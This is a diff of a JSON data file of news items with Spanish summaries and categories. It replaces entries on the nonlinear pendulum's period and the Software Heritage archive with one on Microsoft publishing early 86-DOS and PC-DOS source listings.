-    "resumen": "El artículo analiza la ecuación de movimiento de un péndulo, comparando la aproximación lineal utilizada en cursos introductorios de física con la ecuación diferencial no lineal completa. Se discute por qué la aproximación sin(θ) ≈ θ es válida solo para ángulos pequeños y cómo afecta a la solución. La principal diferencia entre las soluciones lineales y no lineales es que el péndulo no lineal tiene un período ligeramente más largo. Se presenta una aproximación para este aumento del período utilizando el cálculo integral elíptico y se demuestra con un ejemplo numérico (θ0 = 60°) que la diferencia de período es aproximadamente del 7.32%. Se ilustra que, aunque la diferencia es pequeña, es observable y se compara la solución no lineal con una solución lineal modificada en su período.",
-    "categoria": "Ciencia y Matematica"
-  },
-  {
-    "id": 47944818,
-    "url": "https://www.softwareheritage.org/",
-    "score": 3,
-    "time": 1777444139,
-    "titulo_es": "Archivo Universal de Código Fuente",
-    "resumen": "El artículo describe la misión y las capacidades del archivo Software Heritage, cuyo objetivo es recolectar, preservar y hacer accesible el código fuente de software para las generaciones presentes y futuras. Se enfatiza la importancia del software como patrimonio cultural, conocimiento científico y habilitador de procesos industriales. Se detallan las funcionalidades para buscar, navegar y archivar código fuente bajo demanda, así como el acceso programático a través de una API que permite explorar el archivo como un grafo de objetos relacionados con el desarrollo (contenidos de archivos, directorios, commits, releases). El archivo complementa el rastreo regular de orígenes de software y permite a investigadores e industrias asegurar la preservación de artefactos de software, garantizando la reproducibilidad científica, el rastreo de procedencia y el inventario de software.",
+    "id": 47957494,
+    "url": "https://opensource.microsoft.com/blog/2026/04/28/continuing-the-story-of-early-dos-development/",
+    "score": 57,
+    "time": 1777517577,
+    "titulo_es": "Microsoft preserva y hace accesible el código fuente más antiguo de DOS, incluyendo 86-DOS y PC-DOS",
+    "resumen": "Microsoft continúa su iniciativa de preservar la historia del software de sistemas al hacer público el código fuente de versiones tempranas de DOS, incluyendo 86-DOS 1.00 y listados de desarrollo de PC-DOS 1.00. Estos materiales, transcritos a partir de listados de ensamblador y notas originales de Tim Paterson, el autor de DOS, ofrecen una visión única y detallada de cómo se desarrollaban los sistemas operativos en la década de 1970 y principios de 1980. El proyecto, liderado por Yufeng Gao y Rich Cini, va más allá de la simple publicación en repositorios como GitHub, involucrando el escaneo, transcripción y validación técnica de artefactos analógicos. Los listados incluyen el kernel de 86-DOS, snapshots del kernel de PC-DOS 1.00 y utilidades como CHKDSK, además del propio ensamblador. Estos documentos funcionan como un historial de cambios impreso, mostrando la evolución de las características, errores y correcciones. Los materiales han sido donados al Interim Computer Museum y el código fuente está disponible bajo licencia MIT para investigadores y entusiastas a través del repositorio DOS-History/Paterson-Listings. El artículo también menciona brevemente otros lanzamientos de código abierto de Microsoft, como MS-DOS 1.25/2.11 y 6502 BASIC, y la iniciativa Agent Governance Toolkit para IA.",
     "categoria": "Desarrollo de Software"
   }
 ]
